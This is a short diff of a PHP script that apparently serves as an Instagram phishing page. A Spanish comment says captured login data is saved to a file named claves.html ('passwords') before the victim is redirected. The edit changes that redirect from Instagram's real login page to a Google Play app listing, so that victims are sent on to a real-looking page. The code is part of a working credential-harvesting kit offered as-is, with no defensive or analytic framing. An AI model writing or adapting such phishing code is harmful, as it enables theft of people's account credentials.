@@ -25,7 +25,7 @@ Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 fclose($f);
  
 //despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
-header("Location:  https://instagram.com/accounts/login/");
+header("Location: https://play.google.com/store/apps/details?id=com.ii.flappyBird");
 }
 ?>
  
